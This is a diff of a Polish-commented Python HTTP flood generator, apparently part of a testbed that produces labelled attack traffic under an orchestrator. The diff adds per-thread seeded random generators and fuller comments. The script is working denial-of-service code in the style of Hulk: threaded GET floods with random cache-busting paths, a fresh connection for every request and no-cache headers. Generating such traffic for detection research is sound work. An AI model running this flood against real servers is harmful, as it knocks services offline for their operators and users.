@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """Generator HTTP flood.
 
-Rola: Generuje atak HTTP flood (A4) - zalew krótkich żądań GET do serwera web, wzorzec Hulk/GoldenEye.
+Rola: Generuje atak HTTP flood (A4) - zalew krótkich żądań GET do serwera web: losowe ścieżki jak w Hulk,
+nowe połączenie na każde żądanie (bez keep-alive), stały User-Agent.
 Uruchamia go orchestrator.run_http_flood; log z requests=<n> czyta tool_logs.flood_requests
 - niezależna kontrola etykiet w check_labels.
 
@@ -16,23 +17,25 @@ import time
 
 STOP = threading.Event() #wspólny wyłącznik - main ustawia go po duration a wątki co iteracje sprawdzaja i koncza
 COUNT = [0] # wspolny licznik udanych żądań
+#nieudane połączenia też dają przepływy, ale nie wchodzą do licznika
 LOCK = threading.Lock() #chroni dostęp do licznika
 
 #losowa ścieżka (cache-busting): każde żądanie jest "inne", więc żaden cache nie odpowie za serwer
 # to flood na backend - wzorzec Hulk
-def rand_path():
-    parameter = "".join(random.choices(string.ascii_letters + string.digits, k=8))
-    return f"/?{parameter}={random.randint(0, 10**6)}"
+def rand_path(rng):
+    parameter = "".join(rng.choices(string.ascii_letters + string.digits, k=8))
+    return f"/?{parameter}={rng.randint(0, 10**6)}"
 
 #Jeden wątek: dopóki nie STOP - otwórz połączenie na port 80, wyślij GET z losową ścieżka, odczytaj i zamknij
 #zwiększ licznik pod blokadą. Cache-control: no-cache - dodatkowo wymusza świeżą odpowiedź;
 #except: pass - pod obciążeniem
 # błędy połączeń są normalne, więc milczymy
-def worker(target, min_interval):
+#rng: własny generator wątku (ziarno "<seed>/<numer wątku>"), żeby ścieżki nie zależały od planisty
+def worker(target, min_interval, rng):
     while not STOP.is_set():
         try:
             conn = http.client.HTTPConnection(target, 80, timeout=5)
-            conn.request("GET", rand_path(), headers={"User-Agent": "flood/1.0", "Cache-Control": "no-cache"})
+            conn.request("GET", rand_path(rng), headers={"User-Agent": "flood/1.0", "Cache-Control": "no-cache"})
             conn.getresponse().read()
             conn.close()
             with LOCK:
@@ -55,14 +58,16 @@ def main():
     parser.add_argument("--seed", type=int, default=0, help="ziarno losowych ścieżek (podaje je orkiestrator)")
     parser.add_argument("--log", required=True)  # plik logu (czyta go tool_logs.flood_requests)
     args = parser.parse_args()
-    random.seed(args.seed)
+    #każdy wątek ma własny generator z ziarna, więc ciąg ścieżek w wątku jest powtarzalny; liczba żądań
+    #zależy jednak od tego, jak szybko odpowiada serwer
 
     # Przybliżony limit tempa: minimalny odstęp na wątek = threads / rps.
     min_interval = max(0.0, args.threads / args.rps) if args.rps else 0.0
     start = time.time()
     # uruchom wszystkie wątki; main odmierza czas ataku (duration), potem STOP i chwila na dokończenie (join)
-    workers = [threading.Thread(target=worker, args=(args.target, min_interval), daemon=True)
-               for _ in range(args.threads)]
+    workers = [threading.Thread(target=worker, daemon=True,
+                                args=(args.target, min_interval, random.Random(f"{args.seed}/{i}")))
+               for i in range(args.threads)]
     for thread in workers:
         thread.start()
     time.sleep(args.duration)
